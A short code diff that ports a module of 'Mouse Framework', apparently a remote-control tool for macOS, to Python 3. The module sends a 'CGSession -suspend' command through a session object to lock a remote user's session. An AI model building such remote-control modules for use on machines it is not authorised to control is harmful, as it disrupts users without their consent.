@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -24,8 +24,8 @@ class command:
         self.description = "Suspend current session."
 
     def run(self,session,cmd_data):
-    	cmd_data["cmd"] = ";"
-    	cmd_data["args"] = '/System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend'
+        cmd_data["cmd"] = ";"
+        cmd_data["args"] = '/System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend'
         result = session.send_command(cmd_data)
         if result:
-        	print result
+            print(result)
